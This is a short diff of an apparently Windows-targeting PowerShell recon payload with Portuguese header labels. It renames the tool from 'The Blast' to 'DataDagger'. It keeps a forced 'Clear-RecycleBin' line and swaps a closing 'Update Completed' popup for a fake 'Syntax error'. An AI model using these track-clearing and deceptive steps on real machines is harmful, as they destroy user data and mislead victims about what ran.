@@ -1,6 +1,6 @@
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
-#   Nome       : The Blast                                                                                                                                 #
+#   Nome       : DataDagger                                                                                                                                 #
 #   Autor      : Clank                                                                                                                                     #
 #   Categoria  : Recon                                                                                                                                     #
 #   Alvo       : Windows 10,11                                                                                                                             #
@@ -319,7 +319,7 @@ $output = @"
 
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
-#   Nome       : The Blast                                                                                                                                 #
+#   Nome       : DataDagger                                                                                                                                 #
 #   Autor      : Clank                                                                                                                                     #
 #   Categoria  : Recon                                                                                                                                     #
 #   Alvo       : Windows 10,11                                                                                                                             #
@@ -598,4 +598,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # sinal que acabou um Pop-up
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
+$done = New-Object -ComObject Wscript.Shell;$done.Popup("Syntax error",1)
